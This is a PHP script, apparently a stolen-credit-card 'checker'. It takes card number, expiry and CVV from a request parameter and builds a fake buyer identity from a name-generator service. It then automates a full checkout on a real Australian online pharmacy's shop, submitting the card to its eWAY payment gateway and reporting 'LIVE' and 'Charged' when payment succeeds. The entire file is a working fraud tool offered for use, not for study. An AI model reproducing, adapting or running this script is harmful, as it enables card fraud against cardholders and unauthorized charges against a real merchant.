<?php
    error_reporting(0);
    $time_start = microtime(true);

    function GetStr($string, $start, $end){
        $str = explode($start, $string);
        $str = explode($end, $str[1]);
        return $str[0];
    }

    function RandomString($length = 12)
    {
        $characters       = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
        $charactersLength = strlen($characters);
        $randomString     = '';
        for ($i = 0; $i < $length; $i++) {
            $randomString .= $characters[rand(0, $charactersLength - 1)];
        }
        return $randomString;
    }

    extract($_GET);
    $separator = explode("|", $lista);
    $cc = $separator[0];
    $mm = $separator[1];
    $yy = $separator[2];
    $cvv = $separator[3];
    $cookie = RandomString();

    $randomShits = file_get_contents('https://namegenerator.in/assets/refresh.php?location=united-states');
    $data = json_decode($randomShits, true);
    $fname = explode(" ", $data['name'])[0];
    $lname = explode(" ", $data['name'])[1];
    $email = $data['email']['address'];
    $street = $data['street1'];
    $local = GetStr($randomShits, '"street2":', ',"phone"');
    $city = GetStr($local, '"', ',');
    $state = GetStr($local, ', ', ' ');
    $postcode = mt_rand(1000, 6000);
    $phone = str_replace("-", "", $data['phone']);

    $curl = curl_init();
    curl_setopt_array($curl, [
        CURLOPT_URL => "https://www.chempro.com.au/epages/shop.sf/en_AU/?",
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_COOKIEJAR => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_COOKIEFILE => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_HTTPHEADER => [
            "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
            "Content-Type: application/x-www-form-urlencoded",
            "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.128 Safari/537.36"
        ],
        CURLOPT_POSTFIELDS => "LastProductObjectID=3012724&ChangeObjectID=3012724&ChangeAction=AddToBasket&ObjectPath=%2FShops%2Fshop%2FProducts%2F27687406&ViewObjectID=3012724&ViewAction=View&Quantity=1&AddToBasket="
    ]);
    $addToCart = curl_exec($curl);
    curl_close($curl);

    $cartId = GetStr($addToCart, 'https://www.chempro.com.au/epages/shop.sf/', '/');
    $objectId = GetStr($addToCart, '<a class="ContextBoxHead" href="?ObjectID=', '"');

    $curl = curl_init();
    curl_setopt_array($curl, [
        CURLOPT_URL => "https://www.chempro.com.au/epages/shop.sf/$cartId/?ObjectID=".$objectId,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_COOKIEJAR => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_COOKIEFILE => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_HTTPHEADER => [
            "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
            "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.128 Safari/537.36"
        ]
    ]);
    $lineItemID = GetStr(curl_exec($curl), 'name="LineItemID" value="', '"');
    curl_close($curl);

    $curl = curl_init();
    curl_setopt_array($curl, [
        CURLOPT_URL => "https://www.chempro.com.au/epages/shop.sf/$cartId/?",
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_COOKIEJAR => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_COOKIEFILE => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_HTTPHEADER => [
            "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
            "Content-Type: application/x-www-form-urlencoded",
            "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.128 Safari/537.36"
        ],
        CURLOPT_POSTFIELDS => "ErrorAction=ViewMultiCheckoutBasket&ErrorObjectID=$objectId&ChangeObjectID=$objectId&LastProductObjectID=&ChangeAction=SaveMultiCheckoutBasket&ValidButton=SaveMultiCheckoutBasket&ViewAction=ViewMultiCheckoutAddress&LineItemID=$lineItemID&Quantity=1&ValidButton=RedeemCoupon&ExtraChangeAction=&CouponCode=&SaveMultiCheckoutBasket="
    ]);
    curl_exec($curl);
    curl_close($curl);

    $curl = curl_init();
    curl_setopt_array($curl, [
        CURLOPT_URL => "https://www.chempro.com.au/epages/shop.sf/$cartId/?",
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_COOKIEJAR => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_COOKIEFILE => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_HTTPHEADER => [
            "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
            "Content-Type: application/x-www-form-urlencoded",
            "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.128 Safari/537.36"
        ],
        CURLOPT_POSTFIELDS => "CustomerType=GetMember&ChangeAction=SaveCustomerData&ChangeObjectID=$objectId&ErrorAction=ViewMultiCheckoutAddress&ErrorObjectID=$objectId&Company=&Title=&FirstName=$fname&LastName=$lname&Street=$street&City=Bundaberg&State=NSW&Zipcode=$postcode&CountryID=36&Birthday=02%2F02%2F1990&Phone=$phone&EMail=$fname$lname$cookie@gmail.com&ShippingCompany=&ShippingTitle=&ShippingFirstName=&ShippingLastName=&ShippingStreet=&ShippingCity=&ShippingState=&ShippingZipcode=&ShippingCountryID=36&ShippingPhone=&ShippingEMail=&UserName=&Password=$cookie&PasswordConf=$cookie&AcceptPrivacyPolicy=on&ViewAction=ViewMultiCheckoutShipping&ViewObjectID=$objectId&ChangeAction=SaveMultiCheckoutAddress&ChangeObjectID=$objectId"
    ]);
    $shippingMethod = GetStr(curl_exec($curl), 'name="ShippingMethod" id="ShippingMethod_', '"');
    curl_close($curl);

    $curl = curl_init();
    curl_setopt_array($curl, [
        CURLOPT_URL => "https://www.chempro.com.au/epages/shop.sf/$cartId/?",
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_COOKIEJAR => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_COOKIEFILE => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_HTTPHEADER => [
            "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
            "Content-Type: application/x-www-form-urlencoded",
            "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.128 Safari/537.36"
        ],
        CURLOPT_POSTFIELDS => "ShippingMethod=$shippingMethod&IsLeaveDeliveryAllowed=1&ViewAction=ViewMultiCheckoutPayment&ViewObjectID=$objectId&ChangeAction=SaveMultiCheckoutShipping&ChangeObjectID=$objectId"
    ]);
    $N1 = curl_exec($curl);
    curl_close($curl);

    $paymentMethod = GetStr($N1, 'name="PaymentMethod" id="PaymentMethod_', '"');
    $totalAmount = GetStr($N1, 'Total amount <span>', '<');

    $curl = curl_init();
    curl_setopt_array($curl, [
        CURLOPT_URL => "https://www.chempro.com.au/epages/shop.sf/$cartId/?",
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_COOKIEJAR => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_COOKIEFILE => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_HTTPHEADER => [
            "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
            "Content-Type: application/x-www-form-urlencoded",
            "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.128 Safari/537.36"
        ],
        CURLOPT_POSTFIELDS => "tac=1&PaymentMethod=$paymentMethod&ViewAction=ViewMultiCheckoutConfirmation&ViewObjectID=$objectId&ChangeAction=SaveMultiCheckoutPayment&ChangeObjectID=$objectId"
    ]);
    curl_exec($curl);
    curl_close($curl);

    $curl = curl_init();
    curl_setopt_array($curl, [
        CURLOPT_URL => "https://www.chempro.com.au/epages/shop.sf/$cartId/?",
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_COOKIEJAR => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_COOKIEFILE => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_HTTPHEADER => [
            "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
            "Content-Type: application/x-www-form-urlencoded",
            "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.128 Safari/537.36"
        ],
        CURLOPT_POSTFIELDS => "tac=1&customerinformation=1&ChangeAction=TestTermsAndConditions&ChangeAction=TestCustomerInformation&CustomerComment=&ViewAction=ViewMultiPaymenteWAYRapid&ViewObjectID=$objectId&ChangeAction=SaveMultiCheckoutConfirmation&ChangeObjectID=$objectId"
    ]);
    $paymentGUID = GetStr(curl_exec($curl), '<input type="hidden" name="M_PaymentGUID" value="', '"');
    curl_close($curl);

    $curl = curl_init();
    curl_setopt_array($curl, [
        CURLOPT_URL => "https://www.chempro.com.au/epages/shop.sf/$cartId/?ObjectID=".$objectId,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_COOKIEJAR => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_COOKIEFILE => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_HTTPHEADER => [
            "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
            "Content-Type: application/x-www-form-urlencoded",
            "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.128 Safari/537.36"
        ],
        CURLOPT_POSTFIELDS => "ErrorAction=ViewMultiPaymenteWAYRapid&ViewAction=ViewMultiPaymenteWAYRapid&M_PaymentGUID=$paymentGUID&Currency=AUD&CardNumber=$cc&ExpiryMonth=".ltrim($mm, "0")."&ExpiryYear=$yy&CVN=$cvv&CardholdersName=$fname+$lname&ChangeAction=DoeWAYRapidPayment"
    ]);
    $exec = curl_exec($curl);
    curl_close($curl);

    $dcode = GetStr($exec, 'Ref:: ', ')');
    $message = GetStr(file_get_contents("https://github.com/eWAYPayment/eway-rapid-php/blob/master/resource/lang/en.ini"), $dcode.'</span> = <span class="pl-s"><span class="pl-pds">&#39;</span>', '<span');

    $response = "$dcode - $message";

    if(strpos($exec, 'HostedPaymentStatus=Complete')) {

        echo '<tr><td><span class="badge badge-success badge-pill">LIVE</span></td><td><span> => </span></td><td><span class="badge badge-dark badge-pill">'.$lista.'</span></td> <td><span class="badge badge-success badge-pill">Charged</span></td></tr><br>';

    } else {

        echo '<tr><td><span class="badge badge-dark badge-pill">'.$lista.'</span></td><td><span> => </span></td><td><span class="badge badge-danger badge-pill">'.$response.'</span></td> <td><span class="badge badge-info badge-pill">Took '.number_format(microtime(true) - $time_start, 2).' seconds</span></td></tr><br>';

    }
    unlink("cookies/$cookie.txt");
?>